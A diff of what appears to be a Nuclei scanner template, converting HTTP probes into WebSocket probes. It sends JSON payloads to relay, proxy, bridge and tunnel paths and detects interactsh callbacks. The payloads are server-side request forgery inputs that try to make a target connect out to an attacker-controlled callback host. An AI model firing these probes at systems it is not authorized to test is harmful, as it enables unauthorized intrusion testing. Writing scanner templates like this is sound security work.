@@ -20,104 +20,76 @@ info:
 variables:
   callback_url: "{{interactsh-url}}"
 
-http:
-  - method: POST
+websocket:
+  - address: "{{BaseURL}}"
     path:
-      - "{{BaseURL}}/ws/relay"
-      - "{{BaseURL}}/websocket/proxy"
-      - "{{BaseURL}}/api/ws/forward"
-      - "{{BaseURL}}/bridge/connect"
-      - "{{BaseURL}}/ws/tunnel"
+      - "/ws"
+      - "/websocket"
+      - "/socket.io/"
+      - "/api/ws"
+      - "/bridge"
+      - "/tunnel"
 
-    headers:
-      Content-Type: application/json
-      Accept: application/json
+    inputs:
+      - data: |
+          {
+            "type": "relay",
+            "target": "{{callback_url}}",
+            "relay_to": "{{callback_url}}/endpoint",
+            "forward_url": "{{callback_url}}/webhook"
+          }
+      - data: |
+          {
+            "action": "message_relay",
+            "relay_config": {
+              "url": "{{callback_url}}",
+              "method": "GET",
+              "headers": {"User-Agent": "WebSocket-Relay"}
+            }
+          }
+      - data: |
+          {
+            "command": "bridge_setup",
+            "bridge_config": {
+              "upstream": "{{callback_url}}",
+              "downstream": "ws://{{callback_url}}/ws",
+              "proxy_headers": true
+            }
+          }
 
-    body: |
-      {
-        "target": "{{callback_url}}",
-        "relay_to": "{{callback_url}}/endpoint",
-        "forward_url": "{{callback_url}}/webhook"
-      }
-
-  - method: POST
+  - address: "{{BaseURL}}"
     path:
-      - "{{BaseURL}}/ws/message"
-      - "{{BaseURL}}/websocket/send"
-      - "{{BaseURL}}/api/ws/broadcast"
+      - "/ws/proxy"
+      - "/websocket/forward"
+      - "/api/ws/tunnel"
 
-    headers:
-      Content-Type: application/json
-      Accept: application/json
+    inputs:
+      - data: |
+          {
+            "type": "proxy_config",
+            "proxy_target": "{{callback_url}}",
+            "webhook_url": "{{callback_url}}/callback",
+            "forward_all": true,
+            "external_relay": "{{callback_url}}/relay"
+          }
+      - data: |
+          {
+            "action": "external_connect",
+            "external_ws": "wss://{{callback_url}}/ws",
+            "relay_messages": true,
+            "callback_on_connect": "{{callback_url}}/connected"
+          }
+      - data: |
+          {
+            "command": "tunnel_create",
+            "tunnel_target": "{{callback_url}}",
+            "callback_url": "{{callback_url}}/tunnel-ready"
+          }
 
-    body: |
-      {
-        "type": "relay",
-        "message": {
-          "url": "{{callback_url}}",
-          "method": "GET",
-          "headers": {"User-Agent": "WebSocket-Relay"}
-        }
-      }
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/ws/bridge"
-      - "{{BaseURL}}/websocket/connect"
-      - "{{BaseURL}}/api/ws/tunnel"
-
-    headers:
-      Content-Type: application/json
-      Accept: application/json
-
-    body: |
-      {
-        "bridge_config": {
-          "upstream": "{{callback_url}}",
-          "downstream": "ws://{{callback_url}}/ws",
-          "proxy_headers": true
-        }
-      }
-
-  - method: PUT
-    path:
-      - "{{BaseURL}}/ws/config"
-      - "{{BaseURL}}/websocket/settings"
-      - "{{BaseURL}}/api/ws/proxy-config"
-
-    headers:
-      Content-Type: application/json
-      Accept: application/json
-
-    body: |
-      {
-        "proxy_target": "{{callback_url}}",
-        "webhook_url": "{{callback_url}}/callback",
-        "forward_all": true,
-        "external_relay": "{{callback_url}}/relay"
-      }
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/ws/external"
-      - "{{BaseURL}}/websocket/external-connect"
-      - "{{BaseURL}}/api/ws/remote"
-
-    headers:
-      Content-Type: application/json
-      Accept: application/json
-
-    body: |
-      {
-        "external_ws": "wss://{{callback_url}}/ws",
-        "relay_messages": true,
-        "callback_on_connect": "{{callback_url}}/connected"
-      }
-
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
-          - "dns"
-        condition: or
+matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+      - "http"
+      - "dns"
+    condition: or
